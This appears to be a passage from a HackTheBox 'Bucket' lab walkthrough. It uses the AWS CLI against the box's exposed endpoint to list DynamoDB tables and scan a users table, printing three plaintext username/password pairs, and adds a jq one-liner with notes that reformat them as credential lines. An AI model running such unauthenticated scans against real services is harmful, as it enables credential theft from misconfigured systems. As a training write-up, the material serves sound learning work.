## Dumping dynamodb
```Bash
┌─[user@parrot-virtual]─[~/htb/bucket]
└──╼ $aws configure
AWS Access Key ID [****************ckme]: 
AWS Secret Access Key [****************wned]: 
Default region name [us-east-1]: 
Default output format [json]: text
┌─[user@parrot-virtual]─[~/htb/bucket]
└──╼ $aws --endpoint-url http://s3.bucket.htb dynamodb list-tables
TABLENAMES	users
┌─[user@parrot-virtual]─[~/htb/bucket]
└──╼ $aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users
None	3	3
PASSWORD	Management@#1@#
USERNAME	Mgmt
PASSWORD	Welcome123!
USERNAME	Cloudadm
PASSWORD	n2vM-<_K_Q:.Aa2
USERNAME	Sysadm
```

### Alternative
```Bash
┌─[✗]─[user@parrot-virtual]─[~/htb/bucket]
└──╼ $aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r '.Items[] | "\(.username[]):\(.password[])"'
Mgmt:Management@#1@#
Cloudadm:Welcome123!
Sysadm:n2vM-<_K_Q:.Aa2
```

#### Notes on jq
```Bash
jq -r '.Items[] | "\(.username[]):\(.password[])"'

.Items[]  == grabs all passwords and usernames
Pipe within a pipe
TO get rid of json you use [] on the parameters
The : is used to divide the output.
```
